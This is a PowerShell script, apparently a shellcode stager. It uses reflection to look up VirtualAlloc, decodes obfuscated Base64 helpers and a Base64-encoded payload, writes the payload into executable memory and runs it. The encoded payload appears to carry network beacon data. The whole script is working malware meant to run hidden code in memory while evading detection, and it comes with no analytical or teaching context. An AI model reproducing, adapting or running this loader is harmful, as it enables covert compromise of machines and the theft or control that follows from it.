Set-StrictMode -Version 2

function fuc {
    return [System.Text.Encoding]::ASCII.GetString([convert].GetMethod("FromBase64String",[type[]]@('string')).Invoke($null,$args[0]));
}
function fuc1 {
    $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    return $var_unsafe_native_methods.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @("kernel32.dll")))), "VirtualAlloc"))
}
function fuc2 {
    Param (
       [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
       [Parameter(Position = 1)] [Type] $var_return_type = [Void]
    )
    $text = fuc JHZhcl90eXBlX2J1aWxkZXIgPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5EZWZpbmVEeW5hbWljQXNzZW1ibHkoKE5ldy1PYmplY3QgU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHlOYW1lKCdSZWZsZWN0ZWREZWxlZ2F0ZScpKSwgW1N5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQWNjZXNzXTo6UnVuKS5EZWZpbmVEeW5hbWljTW9kdWxlKCdJbk1lbW9yeU1vZHVsZScsICRmYWxzZSkuRGVmaW5lVHlwZSgnTXlEZWxlZ2F0ZVR5cGUnLCAnQ2xhc3MsIFB1YmxpYywgU2VhbGVkLCBBbnNpQ2xhc3MsIEF1dG9DbGFzcycsIFtTeXN0ZW0uTXVsdGljYXN0RGVsZWdhdGVdKQoJJHZhcl90eXBlX2J1aWxkZXIuRGVmaW5lQ29uc3RydWN0b3IoJ1JUU3BlY2lhbE5hbWUsIEhpZGVCeVNpZywgUHVibGljJywgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLCAkdmFyX3BhcmFtZXRlcnMpLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQoJJHZhcl90eXBlX2J1aWxkZXIuRGVmaW5lTWV0aG9kKCdJbnZva2UnLCAnUHVibGljLCBIaWRlQnlTaWcsIE5ld1Nsb3QsIFZpcnR1YWwnLCAkdmFyX3JldHVybl90eXBlLCAkdmFyX3BhcmFtZXRlcnMpLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQ==
    IEX($text)
    return $var_type_builder.CreateType()
}
If ([IntPtr]::size -eq 8) {

    $str = fuc WEhobVkxeDRORGhjZURnelhIaGxORng0WmpCY2VHVTRYSGhqT0Z4NE1EQmNlREF3WEhnd01GeDROREZjZURVeFhIZzBNVng0TlRCY2VEVXlYSGcxTVZ4NE5UWmNlRFE0WEhnek1WeDRaREpjZURZMVhIZzBPRng0T0dKY2VEVXlYSGcyTUZ4NE5EaGNlRGhpWEhnMU1seDRNVGhjZURRNFhIZzRZbHg0TlRKY2VESXdYSGcwT0Z4NE9HSmNlRGN5WEhnMU1GeDRORGhjZURCbVhIaGlOMXg0TkdGY2VEUmhYSGcwWkZ4NE16RmNlR001WEhnME9GeDRNekZjZUdNd1hIaGhZMXg0TTJOY2VEWXhYSGczWTF4NE1ESmNlREpqWEhneU1GeDROREZjZUdNeFhIaGpPVng0TUdSY2VEUXhYSGd3TVZ4NFl6RmNlR1V5WEhobFpGeDROVEpjZURReFhIZzFNVng0TkRoY2VEaGlYSGcxTWx4NE1qQmNlRGhpWEhnME1seDRNMk5jZURRNFhIZ3dNVng0WkRCY2VEWTJYSGc0TVZ4NE56aGNlREU0WEhnd1lseDRNREpjZURjMVhIZzNNbHg0T0dKY2VEZ3dYSGc0T0Z4NE1EQmNlREF3WEhnd01GeDRORGhjZURnMVhIaGpNRng0TnpSY2VEWTNYSGcwT0Z4NE1ERmNlR1F3WEhnMU1GeDRPR0pjZURRNFhIZ3hPRng0TkRSY2VEaGlYSGcwTUZ4NE1qQmNlRFE1WEhnd01WeDRaREJjZUdVelhIZzFObHg0TkRoY2VHWm1YSGhqT1Z4NE5ERmNlRGhpWEhnek5GeDRPRGhjZURRNFhIZ3dNVng0WkRaY2VEUmtYSGd6TVZ4NFl6bGNlRFE0WEhnek1WeDRZekJjZUdGalhIZzBNVng0WXpGY2VHTTVYSGd3WkZ4NE5ERmNlREF4WEhoak1WeDRNemhjZUdVd1hIZzNOVng0WmpGY2VEUmpYSGd3TTF4NE5HTmNlREkwWEhnd09GeDRORFZjZURNNVhIaGtNVng0TnpWY2VHUTRYSGcxT0Z4NE5EUmNlRGhpWEhnME1GeDRNalJjZURRNVhIZ3dNVng0WkRCY2VEWTJYSGcwTVZ4NE9HSmNlREJqWEhnME9GeDRORFJjZURoaVhIZzBNRng0TVdOY2VEUTVYSGd3TVZ4NFpEQmNlRFF4WEhnNFlseDRNRFJjZURnNFhIZzBPRng0TURGY2VHUXdYSGcwTVZ4NE5UaGNlRFF4WEhnMU9GeDROV1ZjZURVNVhIZzFZVng0TkRGY2VEVTRYSGcwTVZ4NE5UbGNlRFF4WEhnMVlWeDRORGhjZURnelhIaGxZMXg0TWpCY2VEUXhYSGcxTWx4NFptWmNlR1V3WEhnMU9GeDROREZjZURVNVhIZzFZVng0TkRoY2VEaGlYSGd4TWx4NFpUbGNlRFJtWEhobVpseDRabVpjZUdabVhIZzFaRng0Tm1GY2VEQXdYSGcwT1Z4NFltVmNlRGMzWEhnMk9WeDRObVZjZURZNVhIZzJaVng0TmpWY2VEYzBYSGd3TUZ4NE5ERmNlRFUyWEhnME9WeDRPRGxjZUdVMlhIZzBZMXg0T0RsY2VHWXhYSGcwTVZ4NFltRmNlRFJqWEhnM04xeDRNalpjZURBM1hIaG1abHg0WkRWY2VEUTRYSGd6TVZ4NFl6bGNlRFE0WEhnek1WeDRaREpjZURSa1hIZ3pNVng0WXpCY2VEUmtYSGd6TVZ4NFl6bGNlRFF4WEhnMU1GeDROREZjZURVd1hIZzBNVng0WW1GY2VETmhYSGcxTmx4NE56bGNlR0UzWEhobVpseDRaRFZjZUdVNVhIZzVNMXg0TURCY2VEQXdYSGd3TUZ4NE5XRmNlRFE0WEhnNE9WeDRZekZjZURReFhIaGlPRng0TTJWY2VEazJYSGd3TUZ4NE1EQmNlRFJrWEhnek1WeDRZemxjZURReFhIZzFNVng0TkRGY2VEVXhYSGcyWVZ4NE1ETmNlRFF4WEhnMU1WeDROREZjZUdKaFhIZzFOMXg0T0RsY2VEbG1YSGhqTmx4NFptWmNlR1ExWEhobFlseDROemxjZURWaVhIZzBPRng0T0RsY2VHTXhYSGcwT0Z4NE16RmNlR1F5WEhnME9WeDRPRGxjZUdRNFhIZzBaRng0TXpGY2VHTTVYSGcxTWx4NE5qaGNlREF3WEhnek1seDRZekJjZURnMFhIZzFNbHg0TlRKY2VEUXhYSGhpWVZ4NFpXSmNlRFUxWEhneVpWeDRNMkpjZUdabVhIaGtOVng0TkRoY2VEZzVYSGhqTmx4NE5EaGNlRGd6WEhoak0xeDROVEJjZURaaFhIZ3dZVng0TldaY2VEUTRYSGc0T1Z4NFpqRmNlR0poWEhneFpseDRNREJjZURBd1hIZ3dNRng0Tm1GY2VEQXdYSGcyT0Z4NE9EQmNlRE16WEhnd01GeDRNREJjZURRNVhIZzRPVng0WlRCY2VEUXhYSGhpT1Z4NE1EUmNlREF3WEhnd01GeDRNREJjZURReFhIaGlZVng0TnpWY2VEUTJYSGc1WlZ4NE9EWmNlR1ptWEhoa05WeDRORGhjZURnNVhIaG1NVng0TkRoY2VEZzVYSGhrWVZ4NE5EbGNlR00zWEhoak1GeDRabVpjZUdabVhIaG1abHg0Wm1aY2VEUmtYSGd6TVZ4NFl6bGNlRFV5WEhnMU1seDROREZjZUdKaFhIZ3laRng0TURaY2VERTRYSGczWWx4NFptWmNlR1ExWEhnNE5WeDRZekJjZURCbVhIZzROVng0T1dSY2VEQXhYSGd3TUZ4NE1EQmNlRFE0WEhobVpseDRZMlpjZURCbVhIZzRORng0T0dOY2VEQXhYSGd3TUZ4NE1EQmNlR1ZpWEhoaU0xeDRaVGxjZUdVMFhIZ3dNVng0TURCY2VEQXdYSGhsT0Z4NE9ESmNlR1ptWEhobVpseDRabVpjZURKbVhIZzNPRng0TkRoY2VEUTJYSGcxTjF4NE1EQmNlR0ZpWEhnelkxeDRaR05jZURGbVhIaGhZbHg0T0daY2VEQmpYSGhpWkZ4NE1EUmNlRGd5WEhnM1pseDRZekZjZURjNFhIZzVNbHg0WTJSY2VEUTFYSGd4T1Z4NE56SmNlR0k1WEhobU1seDRNRFJjZURFNVhIaGtZVng0WlRaY2VHWTFYSGc1T0Z4NFpXTmNlR05oWEhoaE0xeDRNRFJjZURJelhIZ3haVng0WlRkY2VHWTNYSGhpWmx4NFlXVmNlR00xWEhnNU5WeDRZMlpjZUdFMVhIZzNaRng0WlRSY2VHVXpYSGcyTVZ4NFpEbGNlR1EzWEhoaE0xeDRZV1pjZUdVeFhIZ3pNRng0TnpsY2VEZGxYSGhqT0Z4NFlXTmNlREEzWEhoak5GeDRNemxjZURVM1hIZzVNVng0TVRKY2VHUm1YSGhpWWx4NFlXSmNlRGxtWEhnd1kxeDRObU5jZURoa1hIZ3hOMXg0WlRaY2VHSXhYSGczTkZ4NFpHUmNlR1U1WEhnd01GeDROVFZjZURjelhIZzJOVng0TnpKY2VESmtYSGcwTVZ4NE5qZGNlRFkxWEhnMlpWeDROelJjZUROaFhIZ3lNRng0TkdSY2VEWm1YSGczWVZ4NE5qbGNlRFpqWEhnMlkxeDROakZjZURKbVhIZ3pOVng0TW1WY2VETXdYSGd5TUZ4NE1qaGNlRFUzWEhnMk9WeDRObVZjZURZMFhIZzJabHg0TnpkY2VEY3pYSGd5TUZ4NE5HVmNlRFUwWEhneU1GeDRNelpjZURKbFhIZ3pNVng0TTJKY2VESXdYSGcxTjF4NE5qbGNlRFpsWEhnek5seDRNelJjZUROaVhIZ3lNRng0TnpoY2VETTJYSGd6TkZ4NE1qbGNlREl3WEhnME1WeDROekJjZURjd1hIZzJZMXg0TmpWY2VEVTNYSGcyTlZ4NE5qSmNlRFJpWEhnMk9WeDROelJjZURKbVhIZ3pOVng0TXpOY2VETTNYSGd5WlZ4NE16TmNlRE0yWEhneU1GeDRNamhjZURSaVhIZzBPRng0TlRSY2VEUmtYSGcwWTF4NE1tTmNlREl3WEhnMlkxeDROamxjZURaaVhIZzJOVng0TWpCY2VEUTNYSGcyTlZ4NE5qTmNlRFppWEhnMlpseDRNamxjZURJd1hIZzBNMXg0TmpoY2VEY3lYSGcyWmx4NE5tUmNlRFkxWEhneVpseDRNemhjZURNelhIZ3laVng0TXpCY2VESmxYSGd6TkZ4NE16RmNlRE13WEhnek0xeDRNbVZjZURNMlhIZ3pNVng0TWpCY2VEVXpYSGcyTVZ4NE5qWmNlRFl4WEhnM01seDROamxjZURKbVhIZ3pOVng0TXpOY2VETTNYSGd5WlZ4NE16TmNlRE0yWEhnd1pGeDRNR0ZjZURBd1hIaGhabHg0WlRoY2VEVTBYSGd4TWx4NFpXSmNlREZpWEhoaE5GeDRZak5jZURoalhIZzRNVng0TURoY2VEWTJYSGcwTkZ4NE5qVmNlREkxWEhnd01WeDRNMlZjZURJelhIaG1ORng0T0dOY2VHVXdYSGhqTkZ4NE1tRmNlRGt4WEhnd05seDRNVFJjZURjd1hIaG1ORng0TjJGY2VHWmxYSGd3WkZ4NE1UZGNlREZoWEhneE1GeDROemxjZUdVNVhIZzNZMXg0TXpWY2VEZGlYSGhsWTF4NE1XVmNlREk0WEhneU5GeDRNVEJjZUdKbFhIaGlPVng0TVRKY2VEY3lYSGd6T1Z4NE1HVmNlR0UxWEhoak1GeDRZbU5jZURReVhIaGpaRng0T0RGY2VHRXlYSGhoTlZ4NFpERmNlR016WEhnek5GeDRNakpjZURrNVhIaG1ZVng0TW1aY2VHWmpYSGcwTTF4NE9ESmNlR1ZoWEhneVpGeDRNVFZjZURNd1hIZzBZVng0T0RCY2VEQXhYSGc0WTF4NE16WmNlRFkyWEhoaE9WeDRNalZjZUdZMFhIZ3pPRng0WVRaY2VHRTBYSGhpTVZ4NE1EaGNlRGxsWEhnMk4xeDRNMlZjZURZMVhIZzVOVng0TjJOY2VEZzBYSGcxTlZ4NE1qbGNlREZpWEhnNE1GeDRPVFZjZURFMVhIZ3hPVng0WkRkY2VHWXpYSGcxTjF4NE5tTmNlRFpsWEhnMVpWeDRPVFJjZURsbVhIZ3laVng0WkdaY2VEUmhYSGhtTUZ4NE5tTmNlRGd3WEhobU4xeDRZelJjZURCbFhIaGlNMXg0WkROY2VEUTRYSGc0TWx4NE0yWmNlRFJtWEhobFkxeDRPR05jZURVd1hIZzNORng0WmpoY2VEa3dYSGhpTlZ4NE4yUmNlREpqWEhnNU1WeDROelZjZURFelhIaGhPVng0TmpGY2VHTTRYSGhtWWx4NFptUmNlR0pqWEhobVpGeDRNVE5jZUdVMlhIZzVNMXg0WlRaY2VHTTNYSGhoTlZ4NE5HRmNlREJtWEhnMk0xeDROV0pjZURSa1hIZzJabHg0T1RkY2VEZzJYSGhqTjF4NFpqRmNlR1V3WEhneE5GeDRPRGhjZURkbFhIZ3daVng0TVRkY2VEQTBYSGhrTWx4NE1UVmNlR1EyWEhnMU9WeDRNVEJjZURZMlhIaG1PRng0TVRoY2VEQmlYSGhqWlZ4NE1EQmNlRFF4WEhoaVpWeDRaakJjZUdJMVhIaGhNbHg0TlRaY2VHWm1YSGhrTlZ4NE5EaGNlRE14WEhoak9WeDRZbUZjZURBd1hIZ3dNRng0TkRCY2VEQXdYSGcwTVZ4NFlqaGNlREF3WEhneE1GeDRNREJjZURBd1hIZzBNVng0WWpsY2VEUXdYSGd3TUZ4NE1EQmNlREF3WEhnME1WeDRZbUZjZURVNFhIaGhORng0TlROY2VHVTFYSGhtWmx4NFpEVmNlRFE0WEhnNU0xeDROVE5jZURVelhIZzBPRng0T0RsY2VHVTNYSGcwT0Z4NE9EbGNlR1l4WEhnME9GeDRPRGxjZUdSaFhIZzBNVng0WWpoY2VEQXdYSGd5TUZ4NE1EQmNlREF3WEhnME9WeDRPRGxjZUdZNVhIZzBNVng0WW1GY2VERXlYSGc1Tmx4NE9EbGNlR1V5WEhobVpseDRaRFZjZURRNFhIZzRNMXg0WXpSY2VESXdYSGc0TlZ4NFl6QmNlRGMwWEhoaU5seDROalpjZURoaVhIZ3dOMXg0TkRoY2VEQXhYSGhqTTF4NE9EVmNlR013WEhnM05WeDRaRGRjZURVNFhIZzFPRng0TlRoY2VEUTRYSGd3TlZ4NE1EQmNlREF3WEhnd01GeDRNREJjZURVd1hIaGpNMXg0WlRoY2VEZG1YSGhtWkZ4NFptWmNlR1ptWEhnMk5WeDRNbVJjZURZeFhIZzNOVng0TmpOY2VESmxYSGcyWmx4NE56SmNlRFkzWEhnd01GeDRNVEpjZURNMFhIZzFObHg0TnpnPQ==
    [Byte[]]$var_code = [convert].GetMethod("FromBase64String",[type[]]@('string')).Invoke($null,$str) 
    $var_buffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fuc1 ), (fuc2 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $var_code.Length,0x3000, 0x40);
    [System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length);
    $var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (fuc2 @([IntPtr]) ([Void]))).Invoke([IntPtr]::Zero);
}
else {
    IEX $DoIt
}